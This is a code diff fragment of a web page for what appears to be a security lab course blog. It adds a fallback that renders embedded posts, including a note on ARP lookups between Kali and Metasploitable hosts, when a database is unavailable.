+            "text": "Earlier when running `arp -n 192.168.0.155` from inside Metasploitable itself, the kernel reported `no entry` because an operating system never issues an ARP request for its own IP. Testing from Kali immediately populated the complete hardware mapping, proving full cross-host communication."
+          }
+        ]
+      }
+    ]
+  }
+];
   (async () => {
-    const db = window.claude && window.claude.use ? await window.claude.use("db") : null;
-    if (!db) { unavailable(); return; }
-    db.collection("posts").orderBy("n", "asc").onSnapshot(s => renderPosts(s.docs), unavailable);
-    db.doc("meta/course").onSnapshot(renderCourse, () => {});
+    let loadedFromDb = false;
+    if (window.claude && typeof window.claude.use === "function") {
+      try {
+        const db = await window.claude.use("db");
+        if (db) {
+          db.collection("posts").orderBy("n", "asc").onSnapshot(s => {
+            if (s && s.docs && s.docs.length > 0) {
+              renderPosts(s.docs);
+              loadedFromDb = true;
+            } else if (!loadedFromDb) {
+              renderPosts(EMBEDDED_POSTS);
+            }
+          }, () => { if (!loadedFromDb) renderPosts(EMBEDDED_POSTS); });
+          db.doc("meta/course").onSnapshot(snap => {
+            if (snap && snap.exists) renderCourse(snap);
+            else renderCourse({ exists: true, data: () => EMBEDDED_COURSE });
+          }, () => renderCourse({ exists: true, data: () => EMBEDDED_COURSE }));
+          return;
+        }
+      } catch (err) {
+        console.warn("Claude DB unavailable, using embedded entries:", err);
+      }
+    }
+    renderPosts(EMBEDDED_POSTS);
+    renderCourse({ exists: true, data: () => EMBEDDED_COURSE });
   })();
 })();
 </script>
